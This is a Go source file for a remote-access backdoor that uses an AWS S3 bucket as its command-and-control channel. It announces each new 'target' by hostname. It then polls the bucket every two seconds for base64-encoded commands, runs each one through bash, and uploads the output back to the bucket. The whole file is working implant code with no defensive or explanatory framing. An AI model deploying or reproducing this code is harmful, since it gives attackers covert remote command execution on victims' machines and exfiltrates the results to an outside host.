package main

import (
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	exec "os/exec"
	"time"
)

var (
	bucket = flag.String("bucket", "", "bucket name")
	key    = flag.String("key", "mypage", "Key prefix to exchange messages")
	region = flag.String("region", "eu-west-1", "AWS region")
)

func b64Encode(input []byte) []byte {
	data := make([]byte, base64.StdEncoding.EncodedLen(len(input)))
	base64.StdEncoding.Encode(data, input)
	return data
}

func execCmd(input string) ([]byte, error) {
	cmd := exec.Command("/bin/bash", "-c", fmt.Sprintf("echo -ne %s |base64 -d |bash", input))
	out, err := cmd.CombinedOutput()
	return out, err
}

func fetchData(client *http.Client, url string, etag string) ([]byte, string, error) {
	var body []byte
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Add("If-None-Match", etag)
	resp, err := client.Do(req)
	if err != nil {
		return nil, etag, err
	}
	defer resp.Body.Close()
	body, err = ioutil.ReadAll(resp.Body)

	return body, resp.Header.Get("ETag"), nil
}
func uploadData(client *http.Client, url string, data []byte) error {
	req, err := http.NewRequest("PUT", url, bytes.NewReader(data))
	req.Header.Add("x-amz-acl", "bucket-owner-full-control")
	_, err = client.Do(req)
	return err
}
func main() {
	flag.Parse()
	var cmd []byte
	var err error
	etag := "None"
	reqURL := fmt.Sprintf("https://%s.s3.amazonaws.com/%s_req.txt", *bucket, *key)
	respURL := fmt.Sprintf("https://%s.s3.amazonaws.com/%s_resp.txt", *bucket, *key)
	client := &http.Client{}
	if len(*bucket) < 1 {
		log.Fatal("Please provide a bucket name (-bucket)\n")
	}

	hostname, _ := os.Hostname()
	uploadData(client, respURL, b64Encode([]byte(fmt.Sprintf("Got a new target %s", hostname))))

	for {
		time.Sleep(2 * time.Second)
		cmd, etag, err = fetchData(client, reqURL, etag)
		if err != nil {
			fmt.Println(err)
			continue
		}
		if len(cmd) < 1 {
			continue
		}
		go func() {
			output, _ := execCmd(string(cmd))
			if len(output) > 0 {
				uploadData(client, respURL, b64Encode(output))
			}
		}()
	}
}
